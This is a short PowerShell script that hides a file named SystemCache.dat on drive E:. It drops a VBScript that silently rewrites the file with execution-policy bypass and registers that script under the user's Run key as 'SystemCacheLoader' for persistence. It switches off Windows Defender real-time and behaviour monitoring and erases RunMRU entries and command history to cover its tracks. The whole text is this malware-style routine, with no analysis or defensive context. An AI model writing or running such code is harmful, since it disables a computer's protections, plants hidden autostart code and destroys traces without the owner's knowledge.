$filePath = "E:\SystemCache.dat"
$randomContent = -join (48..57 + 65..90 + 97..122 | Get-Random -Count 128 | ForEach-Object { [char]$_ })
[System.IO.File]::WriteAllText($filePath, $randomContent, [System.Text.Encoding]::UTF8)

attrib +s +h +r $filePath

$vbsPath = [System.IO.Path]::GetTempFileName() + '.vbs'
$vbsContent = @"
Set ws = CreateObject("WScript.Shell")
ws.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -C `"[System.IO.File]::WriteAllText('E:\SystemCache.dat', (-join (48..57+65..90+97..122 | Get-Random -Count 128 | %%{[char]`$_})), [System.Text.Encoding]::UTF8); attrib +s +h +r 'E:\SystemCache.dat'`"", 0, True
"@
Set-Content -Path $vbsPath -Value $vbsContent

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemCacheLoader"
$regValue = "wscript.exe `"$vbsPath`""
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force

Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true

Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
Clear-History
